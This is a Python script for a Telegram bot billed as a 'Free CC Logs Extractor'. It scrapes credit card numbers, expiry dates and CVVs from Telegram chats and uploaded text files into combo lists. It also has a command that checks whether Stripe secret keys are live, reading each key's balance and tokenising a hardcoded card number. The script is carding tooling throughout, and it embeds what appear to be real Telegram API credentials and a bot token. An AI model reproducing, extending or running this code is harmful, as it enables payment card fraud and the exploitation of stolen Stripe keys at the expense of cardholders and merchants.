import re
import logging
import time
import requests
from requests.auth import HTTPBasicAuth
from telethon import TelegramClient, events, functions, types
from telethon.tl.custom import Button

# Replace these with your own values
api_id = '26404724'
api_hash = 'c173ec37cd2a6190394a0ec7915e7d50'
bot_token = '6972425077:AAG1-KTOtuR-qVO6siEP1sOnyilWbds8Sy4'
owner_id = 6008343239  # Owner's Telegram ID

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

client = TelegramClient('session_ame', api_id, api_hash)
acc = TelegramClient('acc_ame', api_id, api_hash)

# In-memory set to track seen credit card entries
seen_ccs = set()

# Set to track forbidden words/patterns
forbidden_words = {"badword1", "badword2"}  # Replace with actual words

# Universal function to clean and normalize credit card details
def clean_card_data(cc_number, month, year, cvv):
    formatted_month = month.zfill(2)
    formatted_year = '20' + year if len(year) == 2 else year
    cc_entry = f"{cc_number}|{formatted_month}|{formatted_year}|{cvv}"
    return cc_entry

# Function to extract credit card details in both typical and complex formats
def extract_cc(text):
    formatted_cc = []

    # Regex for standard format (16-digit card with MM/YY and CVV)
    regex_old_format = r'\b(\d{15,16})[/| -]+(\d{1,2})[/| -]+(\d{2,4})[/| -]+(\d{3,4})\b'
    matches_old_format = re.findall(regex_old_format, text)

    # Universal regex for loose formats (CC numbers, expiry dates, CVV without specific labels)
    regex_universal = r'(\b\d{15,16}\b)|(\b\d{3,4}\b)|(\b\d{1,2}[/|-]\d{2,4}\b)'

    matches_universal = re.findall(regex_universal, text)

    # Process standard format matches
    for match in matches_old_format:
        cc_number, month, year, cvv = match
        cc_entry = clean_card_data(cc_number, month, year, cvv)

        # Check for duplicates
        if cc_entry not in seen_ccs:
            formatted_cc.append(cc_entry)
            seen_ccs.add(cc_entry)

    # Process universal format matches
    cc_number, month, year, cvv = "", "", "", ""
    for match in matches_universal:
        if re.match(r'\b\d{15,16}\b', match[0]):
            cc_number = match[0]
        elif re.match(r'\b\d{1,2}[/|-]\d{2,4}\b', match[0]):
            date_match = re.split(r'[/|-]', match[0])
            month, year = date_match[0], date_match[1]
        elif re.match(r'\b\d{3,4}\b', match[0]):
            cvv = match[0]
        
        if cc_number and month and year and cvv:
            cc_entry = clean_card_data(cc_number, month, year, cvv)

            # Check for duplicates
            if cc_entry not in seen_ccs:
                formatted_cc.append(cc_entry)
                seen_ccs.add(cc_entry)
            
            # Reset after each complete match to handle multiple cards
            cc_number, month, year, cvv = "", "", "", ""

    return formatted_cc

@client.on(events.NewMessage(pattern='/start'))
async def welcome(event):
    welcome_message = (
        "Welcome to the Free CC Logs Extractor Bot! 🎉\n"
        "Here are the commands you can use:\n\n"
        "/scrape <chat_name> <amount> - Scrape CC details from a chat\n"
        "/flt - Extract CC details from a text file (reply to the file with this command)\n"
        "/id - Show your user ID and chat ID\n"
        "/sk <sk_key> - Check Stripe SK key details\n"
        "Developer: [OM](https://t.me/rundilundlegamera)"
    )
    await event.reply(welcome_message)

@client.on(events.NewMessage(pattern='/scrape (.*) (\d+)'))
async def handler(event):
    start_time = time.time()
    found_ccs = 0
    msgg = await event.reply("Please wait...")
    chat_name = event.pattern_match.group(1)
    amount = int(event.pattern_match.group(2))

    try:
        chat = await acc.get_input_entity(chat_name)

        async for message in acc.iter_messages(chat):
            text = message.text
            if text:
                # Filter forbidden words/patterns
                if any(word in text for word in forbidden_words):
                    continue
                
                extracted_ccs = extract_cc(text)
                if extracted_ccs:
                    with open("combos/scrapped.txt", "a") as file:
                        for cc in extracted_ccs:
                            file.write(f"{cc}\n")
                    found_ccs += len(extracted_ccs)
                    if found_ccs >= amount:
                        break

        with open("combos/scrapped.txt", "r") as file:
            lines = file.readlines()
            count = len(lines)

        end_time = time.time()
        time_taken = end_time - start_time

        await client.send_file(
            event.chat_id,
            "combos/scrapped.txt",
            caption=f'CCs Found: `{count}`\nTime Taken: `{time_taken:.2f}s`',
            buttons=[[
                Button.url("Owner", "https://t.me/rundilundlegamera")
            ]]
        )
        await msgg.delete()
        with open("combos/scrapped.txt", "w") as file:
            file.write("")
    except Exception as e:
        logger.error(f"Error during scraping: {e}")
        await event.reply("An error occurred during scraping. Please try again later.")

@client.on(events.NewMessage(pattern='/flt'))
async def extract_cc_command(event):
    user_id = event.sender_id
    if event.is_reply and event.message.reply_to_msg_id:
        message = await event.get_reply_message()
        if message.file:
            try:
                start_time = time.time()
                msgg = await event.reply("Please wait...")
                file = await message.download_media(f'combos/fil_{user_id}.txt')
                
                with open(file, "r") as fie:
                    lines = fie.readlines()
                    with open(f"combos/results_{user_id}.txt", "w") as res:
                        found_ccs = 0
                        for line in lines:
                            credit_cards = extract_cc(line)
                            if credit_cards:
                                formatted_cc = credit_cards[0]
                                res.write(f"{formatted_cc}\n")
                                found_ccs += 1

                end_time = time.time()
                time_taken = end_time - start_time

                await msgg.delete()
                await client.send_file(
                    event.chat_id,
                    f"combos/results_{user_id}.txt",
                    caption=f'CCs Found: `{found_ccs}`\nTime Taken: `{time_taken:.2f}s`',
                    buttons=[[
                        Button.url("Owner", "https://t.me/rundilundlegamera")
                    ]]
                )
            except Exception as e:
                logger.error(f"Error processing file: {e}")
                await event.reply("There was an error processing the file.")
        else:
            await event.reply('No file found. Please reply to a text file.')
    else:
        await event.reply('Please reply to a file.')

@client.on(events.NewMessage(pattern='/id'))
async def id_command(event):
    user_id = event.sender_id
    chat_id = event.chat_id
    await event.reply(f'Your User ID: `{user_id}`\nYour Chat ID: `{chat_id}`')

# Command to check Stripe keys with details sent to the owner
async def retrieve_balance(sk):
    bln = "https://api.stripe.com/v1/balance"
    auth = HTTPBasicAuth(sk, '')
    res = requests.get(bln, auth=auth)
    return res.json()

async def check_status(message, sk):
    tic = time.perf_counter()  # Start the timer
    bal_dt = await retrieve_balance(sk)
    try:
        avl_bln = bal_dt['available'][0]['amount']
        pnd_bln = bal_dt['pending'][0]['amount']
        crn = bal_dt['available'][0]['currency']
    except KeyError:
        txtx = f"""
<b>SK KEY :</b>
<code>{sk}</code>
<b>Result : </b>𝗦𝗞 𝗞𝗘𝗬 𝗥𝗘𝗩𝗢𝗞𝗘𝗗 ❌
<b>Checked By</b> ➺ <a href="tg://user?id={message.sender_id}">{message.sender.first_name}</a>
"""
        return txtx

    chk = "https://api.stripe.com/v1/tokens"
    data = 'card[number]=4512238502012742&card[exp_month]=12&card[exp_year]=2023&card[cvc]=354'
    auth = HTTPBasicAuth(sk, '')
    rep = requests.post(chk, data=data, auth=auth)
    repp = rep.text

    if 'rate_limit' in repp:
        r_text = '𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅'
        r_warning = '𝗥𝗔𝗧𝗘 𝗟𝗜𝗠𝗜𝗧 ⚠️'
    elif 'tok_' in repp:
        r_text = '𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅'
        r_warning = '𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅'
    elif 'Invalid API Key provided' in repp:
        r_text = "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗔𝗣𝗜 𝗞𝗘𝗬 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗 ❌"
        r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
    elif 'You did not provide an API key.' in repp:
        r_text = "𝗡𝗢 𝗦𝗞 𝗞𝗘𝗬 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗 ❌"
        r_warning = '𝗡𝗢 𝗦𝗞 𝗞𝗘𝗬 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗 ❌'
    elif 'testmode_charges_only' in repp or 'test_mode_live_card' in repp:
        r_text = "𝗧𝗘𝗦𝗧 𝗠𝗢𝗗𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 𝗢𝗡𝗟𝗬 ❌"
        r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
    elif 'api_key_expired' in repp:
        r_text = "𝗔𝗣𝗜 𝗞𝗘𝗬 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ❌"
        r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
    else:
        r_text = "𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌"
        r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'

    toc = time.perf_counter()  # Stop the timer
    txtxtx = f"""
{r_warning}

<b>SK ➺ </b>
<b><code>{sk}</code></b>
<b>Response :</b> {r_text}
<b>Currency : {crn}</b>
<b>Available Balance : {avl_bln}$</b>
<b>Pending Balance : {pnd_bln}$</b>
<b>Time Took : <code>{toc - tic:.2f}</code> Seconds</b>

<b>Checked By</b> ➺ <a href="tg://user?id={message.sender_id}">{message.sender.first_name}</a>
<b>Bot Made By </b> ➺ <a href="https://t.me/rundilundlegamera"><b>OM</b></a>
"""

    return txtxtx

@client.on(events.NewMessage(pattern='/sk (.+)'))
async def check_sk_command(event):
    sk = event.pattern_match.group(1)
    result_message = await check_status(event, sk)
    await event.reply(result_message, parse_mode="HTML")

async def main():
    await acc.start()
    await client.start(bot_token=bot_token)
    await client.run_until_disconnected()

if __name__ == '__main__':
    client.loop.run_until_complete(main())
